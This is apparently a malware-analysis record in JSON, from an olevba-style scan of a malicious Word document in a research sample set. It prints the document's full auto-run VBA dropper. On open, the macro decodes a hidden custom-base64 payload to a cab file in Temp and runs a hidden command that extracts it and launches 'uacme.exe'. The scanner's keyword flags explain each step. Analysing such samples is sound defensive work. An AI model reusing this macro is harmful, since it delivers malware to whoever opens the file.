{
    "2046bb14d9f63612a6d19d5224727f3607be4e8f8ad13e9efe34620fda2d9d99": {
        "File format": "MS Word 97-2003 Document or Template",
        "Container format": "OLE",
        "Application name": "Microsoft Office Word",
        "Properties code page": "950: ANSI/OEM Traditional Chinese (Taiwan; Hong Kong SAR, PRC); Chinese Traditional (Big5)",
        "Author": "Joseph MUYAMBO",
        "Encrypted": false,
        "VBA Macros": "Yes, suspicious",
        "XLM Macros": "No",
        "External Relationships": 0,
        "ObjectPool": true,
        "Flash objects": 0,
        "VBAMacro": {
            "Filename": [
                "C:\\Users\\ricewater\\Documents\\MITREandCrowdstrikeApr2024Samples\\2046bb14d9f63612a6d19d5224727f3607be4e8f8ad13e9efe34620fda2d9d99\\2046bb14d9f63612a6d19d5224727f3607be4e8f8ad13e9efe34620fda2d9d99"
            ],
            "OLEstream": [
                "Macros/VBA/ThisDocument"
            ],
            "VBAfilename": [
                "ThisDocument.cls"
            ],
            "VBAcode": [
                "Attribute VB_Name = \"ThisDocument\"\r\nAttribute VB_Base = \"1Normal.ThisDocument\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\nAttribute VB_Control = \"TextBox1, 0, 0, MSForms, TextBox\"\r\nAttribute VB_Control = \"TextBox2, 1, 1, MSForms, TextBox\"\r\nPrivate Function debase64(lpInBuffer As String, nOffset As Long, nCount As Long, OutputFile As String) As Long\r\n    Dim strKey As String\r\n    Dim lpOutBuffer() As Byte\r\n    Dim chr1, chr2, chr3, enc1, enc2, enc3, enc4 As Byte\r\n    Dim nIndex, nResult As Long\r\n    \r\n    strKey = \"SbVIn=BU/dqNP2kWw0oCrm9xaJ3tZX6OpFc7Asi4lvuhf-TjMLRQ5GKeEHYgD1yz8\"\r\n  \r\n    ReDim lpOutBuffer(nCount) As Byte\r\n    \r\n    nIndex = 1\r\n    nResult = 0\r\n    \r\n    Do While nIndex <= nCount\r\n        enc1 = InStr(1, strKey, Mid(lpInBuffer, nIndex, 1), 0) - 1\r\n        nIndex = nIndex + 1\r\n        \r\n        enc2 = InStr(1, strKey, Mid(lpInBuffer, nIndex, 1), 0) - 1\r\n        nIndex = nIndex + 1\r\n        \r\n        enc3 = InStr(1, strKey, Mid(lpInBuffer, nIndex, 1), 0) - 1\r\n        nIndex = nIndex + 1\r\n        \r\n        enc4 = InStr(1, strKey, Mid(lpInBuffer, nIndex, 1), 0) - 1\r\n        nIndex = nIndex + 1\r\n        \r\n        chr1 = (enc1 * 4) Or (enc2 \\ 16)\r\n        chr2 = ((enc2 And 15) * 16) Or (enc3 \\ 4)\r\n        chr3 = ((enc3 And 3) * 64) Or enc4\r\n        \r\n        lpOutBuffer(nResult) = chr1\r\n        nResult = nResult + 1\r\n        \r\n        If enc3 <> 64 Then\r\n            lpOutBuffer(nResult) = chr2\r\n            nResult = nResult + 1\r\n        End If\r\n        \r\n        If enc4 <> 64 Then\r\n            lpOutBuffer(nResult) = chr3\r\n            nResult = nResult + 1\r\n        End If\r\n    Loop\r\n    \r\n    ReDim Preserve lpOutBuffer(nResult - 1) As Byte\r\n    \r\n    Open OutputFile For Binary As #2\r\n    Put #2, , lpOutBuffer\r\n    Close #2\r\n    \r\n    debase64 = nResult\r\nEnd Function\r\n\r\nPrivate Function IsWin64() As Boolean\r\n    Dim sTempPath As String\r\n    \r\n    sTempPath = Environ(\"SystemRoot\")\r\n    \r\n    sTempPath = sTempPath + \"\\SysWOW64\"\r\n    \r\n    sTempPath = Dir(sTempPath, vbDirectory)\r\n  \r\n    If sTempPath = \"\" Then\r\n        IsWin64 = False\r\n    Else\r\n        IsWin64 = True\r\n    End If\r\nEnd Function\r\n\r\nPrivate Sub Document_Open()\r\n    Dim nResult As Long\r\n    Dim bResult As Boolean\r\n    Dim sTempPath As String\r\n    Dim sTempFile As String\r\n\r\n    With ActiveDocument.Content\r\n        .Font.ColorIndex = wdBlack\r\n        '.Paragraphs(4).Range.Font.ColorIndex = wdRed\r\n    End With\r\n    \r\n    If TextBox1.Value <> 1 Then\r\n        sTempPath = Environ(\"LOCALAPPDATA\")\r\n        sTempFile = sTempPath & \"\\Temp\\setup.cab\"\r\n        \r\n        bResult = IsWin64()\r\n        \r\n        If bResult = False Then\r\n            nResult = debase64(TextBox1.Text, 0, TextBox1.TextLength, sTempFile)\r\n        Else\r\n            nResult = debase64(TextBox2.Text, 0, TextBox2.TextLength, sTempFile)\r\n        End If\r\n            \r\n        nResult = Shell(\"cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe\", 0)\r\n    End If\r\n    \r\n    TextBox1.Value = 1\r\n    TextBox2.Value = 1\r\n    ActiveDocument.Save\r\nEnd Sub\r\n"
            ],
            "Keyword Types": [
                "AutoExec",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "Suspicious",
                "IOC"
            ],
            "AutoExec keywords": 1,
            "Suspicious keywords": 6,
            "IOCs": 1,
            "Hex obfuscated strings": 0,
            "Base64 obfuscated strings": 1,
            "Dridex obfuscated strings": 0,
            "VBA obfuscated strings": 0
        },
        "Keyword Found": {
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Environ": "May read system environment variables",
            "Open": "May open a file",
            "Put": "May write to a file (if combined with Open)",
            "Binary": "May read or write a binary file (if combined with Open)",
            "Shell": "May run an executable file or a system command",
            "Base64 Strings": "Base64-encoded strings were detected, may be used to obfuscate strings (option --decode to see all)",
            "uacme.exe": "Executable file name"
        }
    }
}